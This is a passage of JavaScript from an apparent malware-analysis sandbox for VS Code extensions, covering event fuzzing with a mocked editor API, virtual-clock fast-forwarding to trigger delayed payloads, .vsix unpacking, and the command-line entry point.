      const listeners = mockVscode._listenerCount(FUZZ_EVENTS);

      if (rounds.length && listeners > 0) {
        process.stdout.write(`  🔵 [SIM] Document-content fuzzing (${rounds.length} rounds × ${listeners} listener(s))\n`);
        for (const seed of rounds) {
          docVersion++;
          const ident = String(seed).replace(/[^A-Za-z0-9_]/g, '_') || 'x';
          // Present the keyword three ways — comment, identifier, string literal —
          // so `includes()`, a word-boundary regex and an identifier match all
          // have something to bite on.
          //
          // Deliberately NOT shaped like a credential assignment. An earlier
          // draft emitted `const token = "<seed>";`, which the secret classifier
          // matched as a dotenv-style secret; the extension then "exfiltrated"
          // our own fuzz text and the report gained a phantom SUSPECTED finding.
          // Bait for the payload must never look like bait for our own detector.
          docText = [
            `// ${seed}`,
            `function handle_${ident}(mode) {`,
            `  if (mode === "${seed}") { return "${seed}"; }`,
            `  return null;`,
            `}`,
            BASE_DOC_TEXT,
            `// end ${seed}`,
          ].join('\n');

          // Payload shapes per event, dispatched through mock-vscode's _fire()
          // which owns the existence check and the try/catch.
          const payloadFor = {
            onDidChangeTextDocument: () => ({ document: mockDoc, reason: undefined,
              contentChanges: [{ range: new mockVscode.Range(0, 0, 0, seed.length),
                                 rangeOffset: 0, rangeLength: 0, text: seed }] }),
            onWillSaveTextDocument:  () => ({ document: mockDoc, reason: 1, waitUntil: () => {} }),
            onDidSaveTextDocument:   () => mockDoc,
            onDidChangeActiveTextEditor:    () => mockEditor,
            onDidChangeTextEditorSelection: () => ({ textEditor: mockEditor, selections: mockEditor.selections, kind: 1 }),
          };
          for (const name of FUZZ_EVENTS) mockVscode._fire(name, payloadFor[name]());
          await settle(FAST ? 2 : 60);
        }
        docText = BASE_DOC_TEXT;   // restore before the fast-forward
      }
    } catch (_) {}
  } catch (simErr) {
    process.stderr.write(`  [SANDBOX] Event simulation error (non-fatal): ${simErr.message}\n`);
  }

  // ── 15.9 Fast-forward the virtual clock ─────────────────────────────────────
  // This REPLACES the passive wall-clock wait that v2 used. Rather than sleeping
  // and hoping a delayed payload fires inside the window, we jump the virtual
  // clock to each scheduled timer and
  // drain the queue up to the 366-day horizon. fastForward() is async and yields
  // to the real event loop between fires (via setImmediate), so it never blocks
  // the Node main thread; every specimen callback is wrapped in try/catch inside
  // the engine, so there are zero unhandled rejections.
  const HORIZON_DAYS = ((Number(process.env.SANDBOX_MAX_VIRTUAL_MS) > 0
    ? Number(process.env.SANDBOX_MAX_VIRTUAL_MS) : 366 * 86400000) / 86400000).toFixed(0);
  console.log(`\n  [*] Fast-forwarding virtual clock to drain time-gated payloads (horizon ${HORIZON_DAYS}d)...`);
  const ffRealStart = Date.now();
  let ff = await tm.fastForward({ untilIdle: true });
  let tmStats = tm.getStats();

  // SECOND PASS. Draining the queue often *creates* new work: a timer fires, its
  // callback awaits a mocked HTTP response, and the `.then` schedules the next
  // beacon. Those new timers land after the first drain reported "idle". One
  // more pass — plus a real-loop yield between them — catches that second
  // generation. Cheap (a no-op when nothing was scheduled) and it recovers
  // multi-stage payloads that stage themselves through the network.
  await new Promise((r) => setImmediate(r));
  if (tm.getStats().pending_timers > 0) {
    const ff2 = await tm.fastForward({ untilIdle: true });
    ff = { ...ff, fired: ff.fired + ff2.fired };
    tmStats = tm.getStats();
  }

  console.log(`  [*] Fast-forward complete: fired ${ff.fired} timer(s); virtual +`
            + `${(tmStats.virtual_elapsed_ms / 86400000).toFixed(2)}d in ${Date.now() - ffRealStart}ms real.\n`);
  // Final real-loop settle so any last real-setImmediate network mocks flush.
  await new Promise(r => setImmediate(r));

  // -- 15.9 Restore global require.cache and Module patches --
  restoreCache();

  // -- 15.10 Write the report --
  writeReport(outputLog, pkg);

  // -- 15.11 Tear down the decoy profile and restore the real environment --
  restoreEnv();
  } finally {
    restoreEnv();
  }
}


// -----------------------------------------------------------------------------
//  SECTION 16 -- Target resolution (.vsix file OR directory at any nesting)
// -----------------------------------------------------------------------------
//
//  The #1 cause of "[FATAL] package.json not found" was pointing the sandbox at
//  the wrong level. A real .vsix unpacks to  <root>/extension/package.json , and
//  the dataset stores each sample as  <publisher.name>/<version>.vsix . This
//  resolver accepts ANY of:
//      • a .vsix file            → unzips to a temp dir, then descends
//      • the extension/ dir      → used directly
//      • a version/parent dir    → descends into extension/ or a child holding
//                                   package.json (searched up to 3 levels deep)
//
//  Returns { dir, outputLog } or null if no package.json can be found.

/**
 * Unpack with the built-in reader. This used to shell out to `unzip` and fall
 * back to `python3`; neither exists on a stock Windows host (where `python3`
 * resolves to the Microsoft Store alias stub), so every .vsix silently failed
 * to open and the sample was reported as having no entry point.
 */
function unzipVsix(vsixPath) {
  const tmp = path.join(os.tmpdir(), `vsix-sandbox-${path.basename(vsixPath, '.vsix').replace(/[^\w.-]/g, '_')}-${process.pid}-${Date.now()}`);
  extractVsix(vsixPath, tmp);
  return tmp;
}

/** Find the directory containing package.json, searching `root` up to `maxDepth`. */
function findPackageDir(root, maxDepth = 3) {
  const queue = [{ dir: root, depth: 0 }];
  // Prefer an explicit extension/ subdir if present at the top.
  if (fs.existsSync(path.join(root, 'extension', 'package.json'))) return path.join(root, 'extension');
  while (queue.length) {
    const { dir, depth } = queue.shift();
    if (fs.existsSync(path.join(dir, 'package.json'))) return dir;
    if (depth >= maxDepth) continue;
    let entries; try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { continue; }
    for (const ent of entries) {
      if (ent.isDirectory() && ent.name !== 'node_modules' && !ent.name.startsWith('.')) {
        queue.push({ dir: path.join(dir, ent.name), depth: depth + 1 });
      }
    }
  }
  return null;
}

function resolveTarget(inputPath) {
  const abs = path.resolve(inputPath);
  if (!fs.existsSync(abs)) { console.error(`[ERROR] Path not found: ${abs}`); process.exit(1); }

  const stat = fs.statSync(abs);

  // Case 1 — a .vsix archive (or any zip): unpack then descend.
  if (stat.isFile()) {
    if (!/\.(vsix|zip)$/i.test(abs)) { console.error(`[ERROR] Not a .vsix/.zip or directory: ${abs}`); process.exit(1); }
    let tmp;
    try { tmp = unzipVsix(abs); } catch (e) { console.error(`[FATAL] ${e.message}`); process.exit(1); }
    const dir = findPackageDir(tmp);
    if (!dir) { console.error(`[FATAL] package.json not found inside ${path.basename(abs)}`); process.exit(1); }
    // Write the log next to the original .vsix so results stay with the sample.
    return { dir, outputLog: path.join(path.dirname(abs), 'execution-log.json') };
  }

  // Case 2 — a directory. Descend to wherever package.json actually lives.
  const dir = findPackageDir(abs);
  if (!dir) { console.error(`[FATAL] package.json not found in or under: ${abs}`); process.exit(1); }
  return { dir, outputLog: path.join(dir, 'execution-log.json') };
}


// -----------------------------------------------------------------------------
//  SECTION 17 -- CLI Entry Point
// -----------------------------------------------------------------------------

const [,, inputArg] = process.argv;

// Preflight — sandbox.js depends on sibling files in the SAME folder.
// Kept in sync with the require() block at the top of this file: decoy-profile
// and zip-util were added in v3 but were missing from this list, so a partial
// copy failed with a raw MODULE_NOT_FOUND instead of the actionable message.
// The old message also told users to copy run_batch.js / run_dataset.js /
// aggregate.js, none of which exist in this engine any more.
const REQUIRED_SIBLINGS = [
  'mock-vscode.js', 'data-intel.js', 'time-machine.js',
  'native-spoof.js', 'decoy-profile.js', 'zip-util.js',
];
for (const sibling of REQUIRED_SIBLINGS) {
  if (!fs.existsSync(path.join(__dirname, sibling))) {
    console.error(`\n[SETUP ERROR] Missing required file: ${sibling}`);
    console.error(`It must sit in the SAME folder as sandbox.js (${__dirname}).`);
    console.error(`sandbox.js needs all of: ${REQUIRED_SIBLINGS.join(', ')}\n`);
    process.exit(1);
  }
}

if (!inputArg) {
  console.error('Usage: node sandbox.js <path-to-extension-dir | .vsix file | version/parent folder>\n');
  console.error('The sandbox auto-descends into extension/ and auto-unzips .vsix files.\n');
  process.exit(1);
}

const target = resolveTarget(inputArg);

runSandbox(target.dir, target.outputLog)
  .catch((e) => {
    console.error('[FATAL UNHANDLED ERROR]', e);
    process.exitCode = 1;
  })
  .finally(() => {
    // EXIT DELIBERATELY, do not wait for the event loop to drain.
    //
    // Analysis is finished and the report was already flushed with a
    // synchronous writeFileSync. But the specimen may still be holding the loop
    // open — an unref'd handle, a mock server, a pending real socket. Those
    // kept the child alive until the orchestrator's per-sample timeout killed
    // it, which cost 60 s per sample and marked 120 VsMex samples "timed out"
    // even though their verdicts had been computed correctly.
    //
    // stdout is flushed first: on Windows a piped stdout is asynchronous, so
    // exiting immediately can truncate the live log.
    const done = () => process.exit(process.exitCode || 0);
    if (process.stdout.write('')) setImmediate(done);
    else process.stdout.once('drain', done);
    // Backstop in case the drain event never arrives.
    setTimeout(done, 2000).unref();
  });
